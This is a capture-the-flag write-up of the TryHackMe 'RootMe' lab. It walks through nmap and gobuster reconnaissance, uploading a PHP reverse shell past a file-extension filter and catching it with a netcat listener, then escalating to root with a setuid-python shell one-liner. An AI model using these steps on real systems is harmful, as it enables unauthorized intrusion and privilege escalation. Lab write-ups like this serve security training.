# RootMe
> 4lch3my | March 07, 2023
-------------------
#### This is a machine that allows you to practise web app hacking and privilege escalation
#### [Room Link](https://tryhackme.com/room/rrootme)

## Tasks
##### 1. Deploy the machine
  Deploy the machine with the Start Machine button, also either deploy your [Attack Box](https://tryhackme.com/access) OR Connect to [OpenVPN](https://tryhackme.com/access) and deploy your personal KALI machine.

##### 2. Reconnaissance

This is where the basics of recon comes into play. To start, I use [nmap] which is default option on the perosnal Kali install I have. We start with a basic command
  `nmap -sC -sV -A MACHINE_IP `
The -sC flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The -sV probes all open ports it finds to determine if we can get the service/version information. -A outputs in agressive mode, so we can follow along with the commands and enumeration.
  In our NMAP results we get:
```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 19:52 CET
Nmap scan report for 10.10.117.20
Host is up (0.050s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4ab9160884c25448ba5cfd3f225f2214 (RSA)
|   256 a9a686e8ec96c3f003cd16d54973d082 (ECDSA)
|_  256 22f6b5a654d9787c26035a95f3f9dfcd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds
```
From this [nmap] scan we can determine that 2 port are open: [SSH] on port 22 and a [http] webserver on port 80. Lets start with the webserver enumeration.
<br>

Gobuster is my go-to enum tool, the setup instructions for it can be found [here]. Let's run a basic scan against our machine: `gobuster dir -u http://MACHINE_IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
This might take a while to run, but we can see the outpot below:
```
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://MACHINE_IP/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/06 19:54:35 Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://MACHINE_IP/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://MACHINE_IP/css/]
/js                   (Status: 301) [Size: 309] [--> http://MACHINE_IP/js/]
/panel                (Status: 301) [Size: 312] [--> http://MACHINE_IP/panel/]
Progress: 35498 / 220561 (16.09%)^C
[!] Keyboard interrupt detected, terminating.

===============================================================
2023/03/06 19:57:33 Finished
===============================================================
```
We have found multiple directory listings from the [gobuster] search. Let's look at them one by one:
<br>

`/panel` contains an upload form where we can choose a file, and upload it.
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/upload.png?raw=true)
Let's try to upload a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php). In the default configuration I have set the `$port` to `1234` and the `$ip` to the IP of our connection IP (this can be seen in the top right corner on the TryHackMe room page in a green bubble). In the mean time, we will open a [netcat] listener with option `-lvp` in a new terminal tab: `nc -lvp 1234`. 

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/fail.png?raw=true)

##### 3. Getting a shell

Hmmm, it seems like no PHP files can be uploaded. We can either manually test with other file types (example: .php5, .phtml, .php.html) or we can use [sAjibuu's Upload Bypass](https://github.com/sAjibuu/upload_bypass/) repo to automate the process. If manually uploadign we can visit `MACHINE_IP/uploads/` to see the uplaoded files and if we use the automated process, we see that our [netcat] listener has cought a shell by itself.

```
Listening on [0.0.0.0] (family 0, port 1234)
Connection from MACHINE_IP 45998 received!
Linux rootme 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
 20:23:11 up  1:32,  0 users,  load average: 0.05, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$
```

Now we finally can start looking for the first flag in `user.txt`.
<br>

First command to is: `find / -type f -name user.txt`. This will look for a `file` containing `user.txt` in the name. And after a quick second ot two, we see our readable file right in the middle:
```
find: '/proc/1671/fd': Permission denied
find: '/proc/1671/map_files': Permission denied
find: '/proc/1671/fdinfo': Permission denied
find: '/proc/1671/ns': Permission denied
/var/www/user.txt
find: '/var/spool/rsyslog': Permission denied
find: '/var/spool/cron/atjobs': Permission denied
find: '/var/spool/cron/crontabs': Permission denied
find: '/var/spool/cron/atspool': Permission denied
```
To get the file contens we can `cat`-it out:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/user.png?raw=true)

##### 3. Privilege escalation

As we are on the machine, we can start looking at some files and permissions what we can abuse. Let's run the `find / -user root -perm /4000` command, to determine if there are any visible for us from the get-go. 
```
find: '/snap/core/8268/var/spool/rsyslog': Permission denied
/snap/core/9665/bin/ping6
/snap/core/9665/bin/su
/snap/core/9665/bin/umount
/usr/bin/python
find: '/snap/core/9665/etc/chatscripts': Permission denied
```
Now we know that python can be run on this machine and maybe we can use it to escalate our priviledges. We can use [GTFOBins](https://gtfobins.github.io/) to check on this.
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/gtfo.png?raw=true)
<br>

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/gtfo_2.png?raw=true)
Now let's run it against the root user: `python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’`
<br>

And there we go, we are `root` ! We can grab the flag now!
![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20RootMe/images/gtfo_2.png?raw=true)

#### Thank you for checking out my writeup about the THM room: RootMe! If you are interested in other writeups of mine or interetsed in some of my codeing work, please feel free to look around my GitHub page! Happy hacking! - 4lch3my